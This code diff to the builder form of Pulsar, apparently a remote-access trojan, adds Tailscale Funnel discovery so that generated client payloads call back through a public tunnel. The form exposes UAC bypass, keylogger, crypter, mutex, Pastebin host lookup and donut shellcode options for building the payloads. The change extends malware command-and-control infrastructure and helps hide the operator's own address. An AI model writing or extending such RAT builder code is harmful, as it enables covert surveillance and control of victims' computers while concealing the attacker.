@@ -3,6 +3,7 @@ using Pulsar.Common.Helpers;
 using Pulsar.Server.Build;
 using Pulsar.Server.Forms.DarkMode;
 using Pulsar.Server.Models;
+using Pulsar.Server.Networking;
 using Pulsar.Server.Utilities;
 using System;
 using System.Collections.Generic;
@@ -24,6 +25,9 @@ namespace Pulsar.Server.Forms
         private readonly BindingList<Host> _hosts = new BindingList<Host>();
 
         private readonly HostsConverter _hostsConverter = new HostsConverter();
+        private readonly TailscaleFunnelService _tailscaleFunnelService;
+        private Label _funnelNoticeLabel;
+        private string _manualHostsBackup = string.Empty;
         private Label lblPortNotification;
         private System.Windows.Forms.Timer portNotificationTimer;
         private System.Windows.Forms.Timer portSetDelayTimer;
@@ -33,7 +37,10 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);            
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+
+            _tailscaleFunnelService = TailscaleFunnelService.Instance;
+            _tailscaleFunnelService.FunnelEndpointChanged += OnFunnelEndpointChanged;
 
             txtHost.TextChanged += txtHost_TextChanged;
             txtHost.KeyDown += TxtHost_KeyDown;
@@ -57,9 +64,19 @@ namespace Pulsar.Server.Forms
             portSetDelayTimer = new System.Windows.Forms.Timer();
             portSetDelayTimer.Interval = 1000;
             portSetDelayTimer.Tick += PortSetDelayTimer_Tick;
-            
+
             checkBox1.CheckedChanged += CheckBox1_CheckedChanged;
             chkCryptable.CheckedChanged += ChkCryptable_CheckedChanged;
+
+            _funnelNoticeLabel = new Label
+            {
+                AutoSize = true,
+                ForeColor = Color.DodgerBlue,
+                Visible = false,
+                Text = "Hosts managed by Tailscale funnel discovery.",
+                Location = new Point(lstHosts.Left, lstHosts.Bottom + 5)
+            };
+            Controls.Add(_funnelNoticeLabel);
         }
         
         private void CheckBox1_CheckedChanged(object sender, EventArgs e)
@@ -304,6 +321,11 @@ namespace Pulsar.Server.Forms
             chkUACBypass.Checked = profile.EnableUACBypass;
 
             _profileLoaded = true;
+
+            if (Settings.UseTailscaleFunnel)
+            {
+                ApplyFunnelHostsIfEnabled();
+            }
         }
 
         private void SaveProfile(string profileName)
@@ -311,7 +333,9 @@ namespace Pulsar.Server.Forms
             var profile = new BuilderProfile(profileName);
 
             profile.Tag = txtTag.Text;
-            profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
+            profile.Hosts = Settings.UseTailscaleFunnel
+                ? Settings.TailscaleFunnelEndpoint
+                : _hostsConverter.ListToRawHosts(_hosts);
             profile.Delay = (int)numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
             profile.Pastebin = txtPastebin.Text;
@@ -361,11 +385,15 @@ namespace Pulsar.Server.Forms
             UpdateKeyloggerControlStates();
             UpdatePastebinUI();
 
+            ApplyFunnelHostsIfEnabled();
+
             btnShellcode.Enabled = File.Exists(Path.Combine(Environment.CurrentDirectory, "donut.exe"));
         }
 
         private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
         {
+            _tailscaleFunnelService.FunnelEndpointChanged -= OnFunnelEndpointChanged;
+
             if (_changed &&
                 MessageBox.Show(this, "Do you want to save your current settings?", "Changes detected",
                     MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
@@ -383,7 +411,7 @@ namespace Pulsar.Server.Forms
             var host = txtHost.Text;
             ushort port = (ushort)numericUpDownPort.Value;
 
-            _hosts.Add(new Host { Hostname = host, Port = port });
+            _hosts.Add(new Host { Hostname = host, Port = port, RawHost = $"{host}:{port}" });
             txtHost.Text = "";
         }
 
@@ -414,6 +442,99 @@ namespace Pulsar.Server.Forms
             _hosts.Clear();
         }
         #endregion
+
+        private void OnFunnelEndpointChanged(object sender, TailscaleFunnelInfo info)
+        {
+            if (IsDisposed || Disposing)
+                return;
+
+            if (InvokeRequired)
+            {
+                BeginInvoke(new Action(ApplyFunnelHostsIfEnabled));
+                return;
+            }
+
+            ApplyFunnelHostsIfEnabled();
+        }
+
+        private void ApplyFunnelHostsIfEnabled()
+        {
+            if (!Settings.UseTailscaleFunnel)
+            {
+                if (!string.IsNullOrEmpty(_manualHostsBackup))
+                {
+                    _hosts.Clear();
+                    foreach (var host in _hostsConverter.RawHostsToList(_manualHostsBackup, true))
+                    {
+                        if (host.Port == 0)
+                        {
+                            host.Port = Settings.ListenPort;
+                        }
+                        _hosts.Add(host);
+                    }
+                }
+
+                ToggleHostEditing(true);
+                _funnelNoticeLabel.Visible = false;
+                _manualHostsBackup = string.Empty;
+                return;
+            }
+
+            if (string.IsNullOrEmpty(_manualHostsBackup))
+            {
+                _manualHostsBackup = _hostsConverter.ListToRawHosts(_hosts);
+            }
+
+            var endpoint = Settings.TailscaleFunnelEndpoint;
+            var hosts = string.IsNullOrWhiteSpace(endpoint)
+                ? new List<Host>()
+                : _hostsConverter.RawHostsToList(endpoint, true);
+
+            _hosts.Clear();
+
+            if (hosts.Count == 0)
+            {
+                var display = string.IsNullOrWhiteSpace(endpoint) ? "discovering..." : endpoint;
+                _hosts.Add(new Host
+                {
+                    Hostname = display,
+                    Port = Settings.ListenPort,
+                    RawHost = display
+                });
+            }
+            else
+            {
+                foreach (var host in hosts)
+                {
+                    if (host.Port == 0)
+                    {
+                        host.Port = Settings.ListenPort;
+                    }
+
+                    if (string.IsNullOrEmpty(host.RawHost))
+                    {
+                        host.RawHost = host.ToString();
+                    }
+
+                    _hosts.Add(host);
+                }
+            }
+
+            ToggleHostEditing(false);
+
+            var status = string.IsNullOrWhiteSpace(endpoint) ? "Awaiting funnel endpoint discovery..." : $"Tailscale funnel endpoint: {endpoint}";
+            _funnelNoticeLabel.Text = status;
+        }
+
+        private void ToggleHostEditing(bool enabled)
+        {
+            txtHost.Enabled = enabled;
+            numericUpDownPort.Enabled = enabled;
+            btnAddHost.Enabled = enabled;
+            lstHosts.Enabled = enabled;
+            contextMenuStrip.Enabled = enabled;
+            _funnelNoticeLabel.Visible = !enabled;
+        }
 
         #region "Misc"
         private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
@@ -545,8 +666,10 @@ namespace Pulsar.Server.Forms
             else
             {
                 options.Pastebin = false;
-                options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
-                
+                options.RawHosts = Settings.UseTailscaleFunnel
+                    ? Settings.TailscaleFunnelEndpoint
+                    : _hostsConverter.ListToRawHosts(_hosts);
+
                 if (options.RawHosts.Length < 2)
                 {
                     throw new Exception("Please enter a valid host to connect to.");
